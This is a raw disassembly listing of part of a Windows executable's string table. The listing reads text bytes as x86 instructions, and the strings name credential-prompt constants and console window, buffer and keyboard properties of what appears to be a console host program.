  406deb:	4d                   	dec    %ebp
  406dec:	45                   	inc    %ebp
  406ded:	00 50 45             	add    %dl,0x45(%eax)
  406df0:	52                   	push   %edx
  406df1:	53                   	push   %ebx
  406df2:	49                   	dec    %ecx
  406df3:	53                   	push   %ebx
  406df4:	54                   	push   %esp
  406df5:	00 53 45             	add    %dl,0x45(%ebx)
  406df8:	52                   	push   %edx
  406df9:	56                   	push   %esi
  406dfa:	45                   	inc    %ebp
  406dfb:	52                   	push   %edx
  406dfc:	5f                   	pop    %edi
  406dfd:	43                   	inc    %ebx
  406dfe:	52                   	push   %edx
  406dff:	45                   	inc    %ebp
  406e00:	44                   	inc    %esp
  406e01:	45                   	inc    %ebp
  406e02:	4e                   	dec    %esi
  406e03:	54                   	push   %esp
  406e04:	49                   	dec    %ecx
  406e05:	41                   	inc    %ecx
  406e06:	4c                   	dec    %esp
  406e07:	00 45 58             	add    %al,0x58(%ebp)
  406e0a:	50                   	push   %eax
  406e0b:	45                   	inc    %ebp
  406e0c:	43                   	inc    %ebx
  406e0d:	54                   	push   %esp
  406e0e:	5f                   	pop    %edi
  406e0f:	43                   	inc    %ebx
  406e10:	4f                   	dec    %edi
  406e11:	4e                   	dec    %esi
  406e12:	46                   	inc    %esi
  406e13:	49                   	dec    %ecx
  406e14:	52                   	push   %edx
  406e15:	4d                   	dec    %ebp
  406e16:	41                   	inc    %ecx
  406e17:	54                   	push   %esp
  406e18:	49                   	dec    %ecx
  406e19:	4f                   	dec    %edi
  406e1a:	4e                   	dec    %esi
  406e1b:	00 47 45             	add    %al,0x45(%edi)
  406e1e:	4e                   	dec    %esi
  406e1f:	45                   	inc    %ebp
  406e20:	52                   	push   %edx
  406e21:	49                   	dec    %ecx
  406e22:	43                   	inc    %ebx
  406e23:	5f                   	pop    %edi
  406e24:	43                   	inc    %ebx
  406e25:	52                   	push   %edx
  406e26:	45                   	inc    %ebp
  406e27:	44                   	inc    %esp
  406e28:	45                   	inc    %ebp
  406e29:	4e                   	dec    %esi
  406e2a:	54                   	push   %esp
  406e2b:	49                   	dec    %ecx
  406e2c:	41                   	inc    %ecx
  406e2d:	4c                   	dec    %esp
  406e2e:	53                   	push   %ebx
  406e2f:	00 55 53             	add    %dl,0x53(%ebp)
  406e32:	45                   	inc    %ebp
  406e33:	52                   	push   %edx
  406e34:	4e                   	dec    %esi
  406e35:	41                   	inc    %ecx
  406e36:	4d                   	dec    %ebp
  406e37:	45                   	inc    %ebp
  406e38:	5f                   	pop    %edi
  406e39:	54                   	push   %esp
  406e3a:	41                   	inc    %ecx
  406e3b:	52                   	push   %edx
  406e3c:	47                   	inc    %edi
  406e3d:	45                   	inc    %ebp
  406e3e:	54                   	push   %esp
  406e3f:	5f                   	pop    %edi
  406e40:	43                   	inc    %ebx
  406e41:	52                   	push   %edx
  406e42:	45                   	inc    %ebp
  406e43:	44                   	inc    %esp
  406e44:	45                   	inc    %ebp
  406e45:	4e                   	dec    %esi
  406e46:	54                   	push   %esp
  406e47:	49                   	dec    %ecx
  406e48:	41                   	inc    %ecx
  406e49:	4c                   	dec    %esp
  406e4a:	53                   	push   %ebx
  406e4b:	00 4b 45             	add    %cl,0x45(%ebx)
  406e4e:	45                   	inc    %ebp
  406e4f:	50                   	push   %eax
  406e50:	5f                   	pop    %edi
  406e51:	55                   	push   %ebp
  406e52:	53                   	push   %ebx
  406e53:	45                   	inc    %ebp
  406e54:	52                   	push   %edx
  406e55:	4e                   	dec    %esi
  406e56:	41                   	inc    %ecx
  406e57:	4d                   	dec    %ebp
  406e58:	45                   	inc    %ebp
  406e59:	00 4e 4f             	add    %cl,0x4f(%esi)
  406e5c:	5f                   	pop    %edi
  406e5d:	45                   	inc    %ebp
  406e5e:	52                   	push   %edx
  406e5f:	52                   	push   %edx
  406e60:	4f                   	dec    %edi
  406e61:	52                   	push   %edx
  406e62:	00 45 52             	add    %al,0x52(%ebp)
  406e65:	52                   	push   %edx
  406e66:	4f                   	dec    %edi
  406e67:	52                   	push   %edx
  406e68:	5f                   	pop    %edi
  406e69:	43                   	inc    %ebx
  406e6a:	41                   	inc    %ecx
  406e6b:	4e                   	dec    %esi
  406e6c:	43                   	inc    %ebx
  406e6d:	45                   	inc    %ebp
  406e6e:	4c                   	dec    %esp
  406e6f:	4c                   	dec    %esp
  406e70:	45                   	inc    %ebp
  406e71:	44                   	inc    %esp
  406e72:	00 45 52             	add    %al,0x52(%ebp)
  406e75:	52                   	push   %edx
  406e76:	4f                   	dec    %edi
  406e77:	52                   	push   %edx
  406e78:	5f                   	pop    %edi
  406e79:	4e                   	dec    %esi
  406e7a:	4f                   	dec    %edi
  406e7b:	5f                   	pop    %edi
  406e7c:	53                   	push   %ebx
  406e7d:	55                   	push   %ebp
  406e7e:	43                   	inc    %ebx
  406e7f:	48                   	dec    %eax
  406e80:	5f                   	pop    %edi
  406e81:	4c                   	dec    %esp
  406e82:	4f                   	dec    %edi
  406e83:	47                   	inc    %edi
  406e84:	4f                   	dec    %edi
  406e85:	4e                   	dec    %esi
  406e86:	5f                   	pop    %edi
  406e87:	53                   	push   %ebx
  406e88:	45                   	inc    %ebp
  406e89:	53                   	push   %ebx
  406e8a:	53                   	push   %ebx
  406e8b:	49                   	dec    %ecx
  406e8c:	4f                   	dec    %edi
  406e8d:	4e                   	dec    %esi
  406e8e:	00 45 52             	add    %al,0x52(%ebp)
  406e91:	52                   	push   %edx
  406e92:	4f                   	dec    %edi
  406e93:	52                   	push   %edx
  406e94:	5f                   	pop    %edi
  406e95:	4e                   	dec    %esi
  406e96:	4f                   	dec    %edi
  406e97:	54                   	push   %esp
  406e98:	5f                   	pop    %edi
  406e99:	46                   	inc    %esi
  406e9a:	4f                   	dec    %edi
  406e9b:	55                   	push   %ebp
  406e9c:	4e                   	dec    %esi
  406e9d:	44                   	inc    %esp
  406e9e:	00 45 52             	add    %al,0x52(%ebp)
  406ea1:	52                   	push   %edx
  406ea2:	4f                   	dec    %edi
  406ea3:	52                   	push   %edx
  406ea4:	5f                   	pop    %edi
  406ea5:	49                   	dec    %ecx
  406ea6:	4e                   	dec    %esi
  406ea7:	56                   	push   %esi
  406ea8:	41                   	inc    %ecx
  406ea9:	4c                   	dec    %esp
  406eaa:	49                   	dec    %ecx
  406eab:	44                   	inc    %esp
  406eac:	5f                   	pop    %edi
  406ead:	41                   	inc    %ecx
  406eae:	43                   	inc    %ebx
  406eaf:	43                   	inc    %ebx
  406eb0:	4f                   	dec    %edi
  406eb1:	55                   	push   %ebp
  406eb2:	4e                   	dec    %esi
  406eb3:	54                   	push   %esp
  406eb4:	5f                   	pop    %edi
  406eb5:	4e                   	dec    %esi
  406eb6:	41                   	inc    %ecx
  406eb7:	4d                   	dec    %ebp
  406eb8:	45                   	inc    %ebp
  406eb9:	00 45 52             	add    %al,0x52(%ebp)
  406ebc:	52                   	push   %edx
  406ebd:	4f                   	dec    %edi
  406ebe:	52                   	push   %edx
  406ebf:	5f                   	pop    %edi
  406ec0:	49                   	dec    %ecx
  406ec1:	4e                   	dec    %esi
  406ec2:	53                   	push   %ebx
  406ec3:	55                   	push   %ebp
  406ec4:	46                   	inc    %esi
  406ec5:	46                   	inc    %esi
  406ec6:	49                   	dec    %ecx
  406ec7:	43                   	inc    %ebx
  406ec8:	49                   	dec    %ecx
  406ec9:	45                   	inc    %ebp
  406eca:	4e                   	dec    %esi
  406ecb:	54                   	push   %esp
  406ecc:	5f                   	pop    %edi
  406ecd:	42                   	inc    %edx
  406ece:	55                   	push   %ebp
  406ecf:	46                   	inc    %esi
  406ed0:	46                   	inc    %esi
  406ed1:	45                   	inc    %ebp
  406ed2:	52                   	push   %edx
  406ed3:	00 45 52             	add    %al,0x52(%ebp)
  406ed6:	52                   	push   %edx
  406ed7:	4f                   	dec    %edi
  406ed8:	52                   	push   %edx
  406ed9:	5f                   	pop    %edi
  406eda:	49                   	dec    %ecx
  406edb:	4e                   	dec    %esi
  406edc:	56                   	push   %esi
  406edd:	41                   	inc    %ecx
  406ede:	4c                   	dec    %esp
  406edf:	49                   	dec    %ecx
  406ee0:	44                   	inc    %esp
  406ee1:	5f                   	pop    %edi
  406ee2:	50                   	push   %eax
  406ee3:	41                   	inc    %ecx
  406ee4:	52                   	push   %edx
  406ee5:	41                   	inc    %ecx
  406ee6:	4d                   	dec    %ebp
  406ee7:	45                   	inc    %ebp
  406ee8:	54                   	push   %esp
  406ee9:	45                   	inc    %ebp
  406eea:	52                   	push   %edx
  406eeb:	00 45 52             	add    %al,0x52(%ebp)
  406eee:	52                   	push   %edx
  406eef:	4f                   	dec    %edi
  406ef0:	52                   	push   %edx
  406ef1:	5f                   	pop    %edi
  406ef2:	49                   	dec    %ecx
  406ef3:	4e                   	dec    %esi
  406ef4:	56                   	push   %esi
  406ef5:	41                   	inc    %ecx
  406ef6:	4c                   	dec    %esp
  406ef7:	49                   	dec    %ecx
  406ef8:	44                   	inc    %esp
  406ef9:	5f                   	pop    %edi
  406efa:	46                   	inc    %esi
  406efb:	4c                   	dec    %esp
  406efc:	41                   	inc    %ecx
  406efd:	47                   	inc    %edi
  406efe:	53                   	push   %ebx
  406eff:	00 55 73             	add    %dl,0x73(%ebp)
  406f02:	65 72 00             	gs jb  0x406f05
  406f05:	50                   	push   %eax
  406f06:	61                   	popa
  406f07:	73 73                	jae    0x406f7c
  406f09:	77 6f                	ja     0x406f7a
  406f0b:	72 64                	jb     0x406f71
  406f0d:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  406f11:	61                   	popa
  406f12:	69 6e 00 43 6f 6e 73 	imul   $0x736e6f43,0x0(%esi),%ebp
  406f19:	6f                   	outsl  %ds:(%esi),(%dx)
  406f1a:	6c                   	insb   (%dx),%es:(%edi)
  406f1b:	65 43                	gs inc %ebx
  406f1d:	6f                   	outsl  %ds:(%esi),(%dx)
  406f1e:	6c                   	insb   (%dx),%es:(%edi)
  406f1f:	6f                   	outsl  %ds:(%esi),(%dx)
  406f20:	72 00                	jb     0x406f22
  406f22:	47                   	inc    %edi
  406f23:	55                   	push   %ebp
  406f24:	49                   	dec    %ecx
  406f25:	42                   	inc    %edx
  406f26:	61                   	popa
  406f27:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406f2a:	72 6f                	jb     0x406f9b
  406f2c:	75 6e                	jne    0x406f9c
  406f2e:	64 43                	fs inc %ebx
  406f30:	6f                   	outsl  %ds:(%esi),(%dx)
  406f31:	6c                   	insb   (%dx),%es:(%edi)
  406f32:	6f                   	outsl  %ds:(%esi),(%dx)
  406f33:	72 00                	jb     0x406f35
  406f35:	47                   	inc    %edi
  406f36:	55                   	push   %ebp
  406f37:	49                   	dec    %ecx
  406f38:	46                   	inc    %esi
  406f39:	6f                   	outsl  %ds:(%esi),(%dx)
  406f3a:	72 65                	jb     0x406fa1
  406f3c:	67 72 6f             	addr16 jb 0x406fae
  406f3f:	75 6e                	jne    0x406faf
  406f41:	64 43                	fs inc %ebx
  406f43:	6f                   	outsl  %ds:(%esi),(%dx)
  406f44:	6c                   	insb   (%dx),%es:(%edi)
  406f45:	6f                   	outsl  %ds:(%esi),(%dx)
  406f46:	72 00                	jb     0x406f48
  406f48:	47                   	inc    %edi
  406f49:	55                   	push   %ebp
  406f4a:	49                   	dec    %ecx
  406f4b:	54                   	push   %esp
  406f4c:	69 74 6c 65 00 67 65 	imul   $0x74656700,0x65(%esp,%ebp,2),%esi
  406f53:	74 
  406f54:	5f                   	pop    %edi
  406f55:	42                   	inc    %edx
  406f56:	61                   	popa
  406f57:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406f5a:	72 6f                	jb     0x406fcb
  406f5c:	75 6e                	jne    0x406fcc
  406f5e:	64 43                	fs inc %ebx
  406f60:	6f                   	outsl  %ds:(%esi),(%dx)
  406f61:	6c                   	insb   (%dx),%es:(%edi)
  406f62:	6f                   	outsl  %ds:(%esi),(%dx)
  406f63:	72 00                	jb     0x406f65
  406f65:	73 65                	jae    0x406fcc
  406f67:	74 5f                	je     0x406fc8
  406f69:	42                   	inc    %edx
  406f6a:	61                   	popa
  406f6b:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  406f6e:	72 6f                	jb     0x406fdf
  406f70:	75 6e                	jne    0x406fe0
  406f72:	64 43                	fs inc %ebx
  406f74:	6f                   	outsl  %ds:(%esi),(%dx)
  406f75:	6c                   	insb   (%dx),%es:(%edi)
  406f76:	6f                   	outsl  %ds:(%esi),(%dx)
  406f77:	72 00                	jb     0x406f79
  406f79:	53                   	push   %ebx
  406f7a:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406f81:	5f                   	pop    %edi
  406f82:	42                   	inc    %edx
  406f83:	75 66                	jne    0x406feb
  406f85:	66 65 72 53          	data16 gs jb 0x406fdc
  406f89:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406f90:	5f                   	pop    %edi
  406f91:	42                   	inc    %edx
  406f92:	75 66                	jne    0x406ffa
  406f94:	66 65 72 53          	data16 gs jb 0x406feb
  406f98:	69 7a 65 00 43 6f 6f 	imul   $0x6f6f4300,0x65(%edx),%edi
  406f9f:	72 64                	jb     0x407005
  406fa1:	69 6e 61 74 65 73 00 	imul   $0x736574,0x61(%esi),%ebp
  406fa8:	67 65 74 5f          	addr16 gs je 0x40700b
  406fac:	43                   	inc    %ebx
  406fad:	75 72                	jne    0x407021
  406faf:	73 6f                	jae    0x407020
  406fb1:	72 50                	jb     0x407003
  406fb3:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb4:	73 69                	jae    0x40701f
  406fb6:	74 69                	je     0x407021
  406fb8:	6f                   	outsl  %ds:(%esi),(%dx)
  406fb9:	6e                   	outsb  %ds:(%esi),(%dx)
  406fba:	00 73 65             	add    %dh,0x65(%ebx)
  406fbd:	74 5f                	je     0x40701e
  406fbf:	43                   	inc    %ebx
  406fc0:	75 72                	jne    0x407034
  406fc2:	73 6f                	jae    0x407033
  406fc4:	72 50                	jb     0x407016
  406fc6:	6f                   	outsl  %ds:(%esi),(%dx)
  406fc7:	73 69                	jae    0x407032
  406fc9:	74 69                	je     0x407034
  406fcb:	6f                   	outsl  %ds:(%esi),(%dx)
  406fcc:	6e                   	outsb  %ds:(%esi),(%dx)
  406fcd:	00 67 65             	add    %ah,0x65(%edi)
  406fd0:	74 5f                	je     0x407031
  406fd2:	43                   	inc    %ebx
  406fd3:	75 72                	jne    0x407047
  406fd5:	73 6f                	jae    0x407046
  406fd7:	72 53                	jb     0x40702c
  406fd9:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406fe0:	5f                   	pop    %edi
  406fe1:	43                   	inc    %ebx
  406fe2:	75 72                	jne    0x407056
  406fe4:	73 6f                	jae    0x407055
  406fe6:	72 53                	jb     0x40703b
  406fe8:	69 7a 65 00 49 6e 76 	imul   $0x766e4900,0x65(%edx),%edi
  406fef:	69 73 69 62 6c 65 5f 	imul   $0x5f656c62,0x69(%ebx),%esi
  406ff6:	46                   	inc    %esi
  406ff7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ff8:	72 6d                	jb     0x407067
  406ffa:	00 46 6c             	add    %al,0x6c(%esi)
  406ffd:	75 73                	jne    0x407072
  406fff:	68 49 6e 70 75       	push   $0x75706e49
  407004:	74 42                	je     0x407048
  407006:	75 66                	jne    0x40706e
  407008:	66 65 72 00          	data16 gs jb 0x40700c
  40700c:	67 65 74 5f          	addr16 gs je 0x40706f
  407010:	46                   	inc    %esi
  407011:	6f                   	outsl  %ds:(%esi),(%dx)
  407012:	72 65                	jb     0x407079
  407014:	67 72 6f             	addr16 jb 0x407086
  407017:	75 6e                	jne    0x407087
  407019:	64 43                	fs inc %ebx
  40701b:	6f                   	outsl  %ds:(%esi),(%dx)
  40701c:	6c                   	insb   (%dx),%es:(%edi)
  40701d:	6f                   	outsl  %ds:(%esi),(%dx)
  40701e:	72 00                	jb     0x407020
  407020:	73 65                	jae    0x407087
  407022:	74 5f                	je     0x407083
  407024:	46                   	inc    %esi
  407025:	6f                   	outsl  %ds:(%esi),(%dx)
  407026:	72 65                	jb     0x40708d
  407028:	67 72 6f             	addr16 jb 0x40709a
  40702b:	75 6e                	jne    0x40709b
  40702d:	64 43                	fs inc %ebx
  40702f:	6f                   	outsl  %ds:(%esi),(%dx)
  407030:	6c                   	insb   (%dx),%es:(%edi)
  407031:	6f                   	outsl  %ds:(%esi),(%dx)
  407032:	72 00                	jb     0x407034
  407034:	42                   	inc    %edx
  407035:	75 66                	jne    0x40709d
  407037:	66 65 72 43          	data16 gs jb 0x40707e
  40703b:	65 6c                	gs insb (%dx),%es:(%edi)
  40703d:	6c                   	insb   (%dx),%es:(%edi)
  40703e:	00 52 65             	add    %dl,0x65(%edx)
  407041:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  407045:	67 6c                	insb   (%dx),%es:(%di)
  407047:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40704b:	74 42                	je     0x40708f
  40704d:	75 66                	jne    0x4070b5
  40704f:	66 65 72 43          	data16 gs jb 0x407096
  407053:	6f                   	outsl  %ds:(%esi),(%dx)
  407054:	6e                   	outsb  %ds:(%esi),(%dx)
  407055:	74 65                	je     0x4070bc
  407057:	6e                   	outsb  %ds:(%esi),(%dx)
  407058:	74 73                	je     0x4070cd
  40705a:	00 67 65             	add    %ah,0x65(%edi)
  40705d:	74 5f                	je     0x4070be
  40705f:	4b                   	dec    %ebx
  407060:	65 79 41             	gs jns 0x4070a4
  407063:	76 61                	jbe    0x4070c6
  407065:	69 6c 61 62 6c 65 00 	imul   $0x6700656c,0x62(%ecx,%eiz,2),%ebp
  40706c:	67 
  40706d:	65 74 5f             	gs je  0x4070cf
  407070:	4d                   	dec    %ebp
  407071:	61                   	popa
  407072:	78 50                	js     0x4070c4
  407074:	68 79 73 69 63       	push   $0x63697379
  407079:	61                   	popa
  40707a:	6c                   	insb   (%dx),%es:(%edi)
  40707b:	57                   	push   %edi
  40707c:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407083:	7a 65                	jp     0x4070ea
  407085:	00 67 65             	add    %ah,0x65(%edi)
  407088:	74 5f                	je     0x4070e9
  40708a:	4d                   	dec    %ebp
  40708b:	61                   	popa
  40708c:	78 57                	js     0x4070e5
  40708e:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407095:	7a 65                	jp     0x4070fc
  407097:	00 4b 65             	add    %cl,0x65(%ebx)
  40709a:	79 49                	jns    0x4070e5
  40709c:	6e                   	outsb  %ds:(%esi),(%dx)
  40709d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40709f:	00 52 65             	add    %dl,0x65(%edx)
  4070a2:	61                   	popa
  4070a3:	64 4b                	fs dec %ebx
  4070a5:	65 79 4f             	gs jns 0x4070f7
  4070a8:	70 74                	jo     0x40711e
  4070aa:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  4070b1:	61                   	popa
  4070b2:	64 4b                	fs dec %ebx
  4070b4:	65 79 00             	gs jns 0x4070b7
  4070b7:	53                   	push   %ebx
  4070b8:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4070bb:	6c                   	insb   (%dx),%es:(%edi)
  4070bc:	6c                   	insb   (%dx),%es:(%edi)
  4070bd:	42                   	inc    %edx
  4070be:	75 66                	jne    0x407126
  4070c0:	66 65 72 43          	data16 gs jb 0x407107
  4070c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4070c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4070c6:	74 65                	je     0x40712d
  4070c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4070c9:	74 73                	je     0x40713e
  4070cb:	00 53 65             	add    %dl,0x65(%ebx)
  4070ce:	74 42                	je     0x407112
  4070d0:	75 66                	jne    0x407138
  4070d2:	66 65 72 43          	data16 gs jb 0x407119
  4070d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4070d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4070d8:	74 65                	je     0x40713f
  4070da:	6e                   	outsb  %ds:(%esi),(%dx)
  4070db:	74 73                	je     0x407150
  4070dd:	00 67 65             	add    %ah,0x65(%edi)
  4070e0:	74 5f                	je     0x407141
  4070e2:	57                   	push   %edi
  4070e3:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4070ea:	73 69                	jae    0x407155
  4070ec:	74 69                	je     0x407157
  4070ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4070f0:	00 73 65             	add    %dh,0x65(%ebx)
  4070f3:	74 5f                	je     0x407154
  4070f5:	57                   	push   %edi
  4070f6:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4070fd:	73 69                	jae    0x407168
  4070ff:	74 69                	je     0x40716a
  407101:	6f                   	outsl  %ds:(%esi),(%dx)
  407102:	6e                   	outsb  %ds:(%esi),(%dx)
  407103:	00 67 65             	add    %ah,0x65(%edi)
  407106:	74 5f                	je     0x407167
  407108:	57                   	push   %edi
  407109:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407110:	7a 65                	jp     0x407177
  407112:	00 73 65             	add    %dh,0x65(%ebx)
  407115:	74 5f                	je     0x407176
  407117:	57                   	push   %edi
  407118:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  40711f:	7a 65                	jp     0x407186
  407121:	00 67 65             	add    %ah,0x65(%edi)
  407124:	74 5f                	je     0x407185
  407126:	57                   	push   %edi
  407127:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  40712e:	74 6c                	je     0x40719c
  407130:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407134:	74 5f                	je     0x407195
  407136:	57                   	push   %edi
  407137:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  40713e:	74 6c                	je     0x4071ac
  407140:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  407144:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407147:	72 6f                	jb     0x4071b8
  407149:	75 6e                	jne    0x4071b9
  40714b:	64 43                	fs inc %ebx
  40714d:	6f                   	outsl  %ds:(%esi),(%dx)
  40714e:	6c                   	insb   (%dx),%es:(%edi)
  40714f:	6f                   	outsl  %ds:(%esi),(%dx)
  407150:	72 00                	jb     0x407152
  407152:	42                   	inc    %edx
  407153:	75 66                	jne    0x4071bb
  407155:	66 65 72 53          	data16 gs jb 0x4071ac
  407159:	69 7a 65 00 43 75 72 	imul   $0x72754300,0x65(%edx),%edi
  407160:	73 6f                	jae    0x4071d1
  407162:	72 50                	jb     0x4071b4
  407164:	6f                   	outsl  %ds:(%esi),(%dx)
  407165:	73 69                	jae    0x4071d0
  407167:	74 69                	je     0x4071d2
  407169:	6f                   	outsl  %ds:(%esi),(%dx)
  40716a:	6e                   	outsb  %ds:(%esi),(%dx)
  40716b:	00 43 75             	add    %al,0x75(%ebx)
  40716e:	72 73                	jb     0x4071e3
  407170:	6f                   	outsl  %ds:(%esi),(%dx)
  407171:	72 53                	jb     0x4071c6
  407173:	69 7a 65 00 46 6f 72 	imul   $0x726f4600,0x65(%edx),%edi
  40717a:	65 67 72 6f          	gs addr16 jb 0x4071ed
  40717e:	75 6e                	jne    0x4071ee
  407180:	64 43                	fs inc %ebx
  407182:	6f                   	outsl  %ds:(%esi),(%dx)
  407183:	6c                   	insb   (%dx),%es:(%edi)
  407184:	6f                   	outsl  %ds:(%esi),(%dx)
  407185:	72 00                	jb     0x407187
  407187:	4b                   	dec    %ebx
  407188:	65 79 41             	gs jns 0x4071cc
  40718b:	76 61                	jbe    0x4071ee
  40718d:	69 6c 61 62 6c 65 00 	imul   $0x4d00656c,0x62(%ecx,%eiz,2),%ebp
  407194:	4d 
  407195:	61                   	popa
  407196:	78 50                	js     0x4071e8
  407198:	68 79 73 69 63       	push   $0x63697379
  40719d:	61                   	popa
  40719e:	6c                   	insb   (%dx),%es:(%edi)
  40719f:	57                   	push   %edi
  4071a0:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  4071a7:	7a 65                	jp     0x40720e
  4071a9:	00 4d 61             	add    %cl,0x61(%ebp)
  4071ac:	78 57                	js     0x407205
  4071ae:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  4071b5:	7a 65                	jp     0x40721c
  4071b7:	00 57 69             	add    %dl,0x69(%edi)
  4071ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4071bb:	64 6f                	outsl  %fs:(%esi),(%dx)
  4071bd:	77 50                	ja     0x40720f
  4071bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4071c0:	73 69                	jae    0x40722b
  4071c2:	74 69                	je     0x40722d
  4071c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4071c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4071c6:	00 57 69             	add    %dl,0x69(%edi)
  4071c9:	6e                   	outsb  %ds:(%esi),(%dx)
  4071ca:	64 6f                	outsl  %fs:(%esi),(%dx)
  4071cc:	77 53                	ja     0x407221
  4071ce:	69 7a 65 00 57 69 6e 	imul   $0x6e695700,0x65(%edx),%edi
  4071d5:	64 6f                	outsl  %fs:(%esi),(%dx)
  4071d7:	77 54                	ja     0x40722d
  4071d9:	69 74 6c 65 00 4d 42 	imul   $0x5f424d00,0x65(%esp,%ebp,2),%esi
  4071e0:	5f 
  4071e1:	47                   	inc    %edi
  4071e2:	65 74 53             	gs je  0x407238
  4071e5:	74 72                	je     0x407259
  4071e7:	69 6e 67 00 44 69 61 	imul   $0x61694400,0x67(%esi),%ebp
  4071ee:	6c                   	insb   (%dx),%es:(%edi)
  4071ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4071f0:	67 52                	addr16 push %edx
  4071f2:	65 73 75             	gs jae 0x40726a
  4071f5:	6c                   	insb   (%dx),%es:(%edi)
  4071f6:	74 00                	je     0x4071f8
  4071f8:	53                   	push   %ebx
  4071f9:	68 6f 77 00 53       	push   $0x5300776f
  4071fe:	79 73                	jns    0x407273
  407200:	74 65                	je     0x407267
  407202:	6d                   	insl   (%dx),%es:(%edi)
  407203:	2e 43                	cs inc %ebx
  407205:	6f                   	outsl  %ds:(%esi),(%dx)
  407206:	6c                   	insb   (%dx),%es:(%edi)
  407207:	6c                   	insb   (%dx),%es:(%edi)
  407208:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40720d:	6e                   	outsb  %ds:(%esi),(%dx)
  40720e:	73 2e                	jae    0x40723e
  407210:	4f                   	dec    %edi
  407211:	62 6a 65             	bound  %ebp,0x65(%edx)
  407214:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  407218:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40721b:	00 43 6f             	add    %al,0x6f(%ebx)
  40721e:	6c                   	insb   (%dx),%es:(%edi)
  40721f:	6c                   	insb   (%dx),%es:(%edi)
  407220:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407225:	6e                   	outsb  %ds:(%esi),(%dx)
  407226:	60                   	pusha
  407227:	31 00                	xor    %eax,(%eax)
  407229:	43                   	inc    %ebx
  40722a:	68 6f 69 63 65       	push   $0x6563696f
  40722f:	44                   	inc    %esp
  407230:	65 73 63             	gs jae 0x407296
  407233:	72 69                	jb     0x40729e
  407235:	70 74                	jo     0x4072ab
  407237:	69 6f 6e 00 54 6f 55 	imul   $0x556f5400,0x6e(%edi),%ebp
  40723e:	6e                   	outsb  %ds:(%esi),(%dx)
  40723f:	69 63 6f 64 65 00 4b 	imul   $0x4b006564,0x6f(%ebx),%esp
  407246:	65 79 73             	gs jns 0x4072bc
  407249:	00 47 65             	add    %al,0x65(%edi)
  40724c:	74 43                	je     0x407291
  40724e:	68 61 72 46 72       	push   $0x72467261
  407253:	6f                   	outsl  %ds:(%esi),(%dx)
  407254:	6d                   	insl   (%dx),%es:(%edi)
  407255:	4b                   	dec    %ebx
  407256:	65 79 73             	gs jns 0x4072cc
  407259:	00 63 68             	add    %ah,0x68(%ebx)
  40725c:	65 63 6b 4b          	arpl   %ebp,%gs:0x4b(%ebx)
  407260:	65 79 44             	gs jns 0x4072a7
  407263:	6f                   	outsl  %ds:(%esi),(%dx)
  407264:	77 6e                	ja     0x4072d4
  407266:	00 6b 65             	add    %ch,0x65(%ebx)
  407269:	79 69                	jns    0x4072d4
  40726b:	6e                   	outsb  %ds:(%esi),(%dx)
  40726c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40726e:	00 4b 65             	add    %cl,0x65(%ebx)
  407271:	79 45                	jns    0x4072b8
  407273:	76 65                	jbe    0x4072da
  407275:	6e                   	outsb  %ds:(%esi),(%dx)
  407276:	74 41                	je     0x4072b9
  407278:	72 67                	jb     0x4072e1
  40727a:	73 00                	jae    0x40727c
  40727c:	4b                   	dec    %ebx
  40727d:	65 79 62             	gs jns 0x4072e2
  407280:	6f                   	outsl  %ds:(%esi),(%dx)
  407281:	61                   	popa
  407282:	72 64                	jb     0x4072e8
  407284:	5f                   	pop    %edi
  407285:	46                   	inc    %esi
  407286:	6f                   	outsl  %ds:(%esi),(%dx)
  407287:	72 6d                	jb     0x4072f6
  407289:	5f                   	pop    %edi
  40728a:	4b                   	dec    %ebx
  40728b:	65 79 44             	gs jns 0x4072d2
  40728e:	6f                   	outsl  %ds:(%esi),(%dx)
  40728f:	77 6e                	ja     0x4072ff
  407291:	00 4b 65             	add    %cl,0x65(%ebx)
